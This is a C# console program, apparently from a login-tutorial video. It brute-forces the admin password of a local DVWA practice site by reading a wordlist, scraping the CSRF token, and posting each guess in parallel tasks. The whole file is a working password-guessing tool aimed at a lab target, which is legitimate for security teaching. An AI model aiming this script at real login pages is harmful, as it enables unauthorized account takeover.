using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace WebsiteLoginTutorialYT
{
    class Program
    {
        static void Main(string[] args)
        {
      
            List<Task> taskList = new List<Task>();
            CancellationTokenSource tokenSource = new CancellationTokenSource();

            List<string> pwdList = new List<string>(System.IO.File.ReadAllLines("pwdlist.txt"));
            Console.WriteLine("Checking " + pwdList.Count + " passwords...");
            foreach (string pwd in pwdList)
            {
                Task checkTask = new Task(() => CheckPassword(pwd,tokenSource));
                checkTask.Start();
                taskList.Add(checkTask);
            }

            Task.WaitAll(taskList.ToArray());
            Console.WriteLine("Done checking all passwords.");
            
            Console.ReadKey();
        }

        static void CheckPassword(string pwd, CancellationTokenSource tokenSource)
        {

            if (!tokenSource.IsCancellationRequested)
            {
                System.Net.CookieContainer myCookies = new System.Net.CookieContainer();
                string myStr = HttpMethods.Get("http://localhost/dvwapp/login.php", "http://localhost/dvwapp/login.php", ref myCookies);
                string token;
                token = GetBetween(myStr, "name='user_token' value='", "' />");
                Console.WriteLine(pwd);
                string postData = "username=" + "admin" + "&password=" + pwd + "&Login=Login&user_token=" + token;

                bool result = HttpMethods.Post("http://localhost/dvwapp/login.php", postData, "http://localhost/dvwapp/login.php", myCookies);
                if (result == true)
                {
                    Console.WriteLine("Found password: " + pwd);
                    tokenSource.Cancel();
                }
            }
        }

        static string GetBetween(string message, string start, string end)
        {
            int startIndex = message.IndexOf(start) + start.Length;
            int stopIndex = message.IndexOf(end);
            return message.Substring(startIndex, stopIndex - startIndex);
        }
    }
}
